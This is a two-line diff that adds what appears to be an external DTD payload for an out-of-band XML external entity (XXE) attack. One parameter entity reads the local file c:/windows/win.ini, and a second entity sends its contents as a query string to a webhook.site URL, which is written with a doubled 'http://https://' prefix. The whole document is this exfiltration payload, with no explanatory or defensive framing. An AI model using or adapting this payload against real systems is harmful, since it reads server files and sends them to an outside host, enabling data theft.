@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://https://webhook.site/56af53f4-fb5e-4098-9023-89a32eee41f6/?%data;'>">
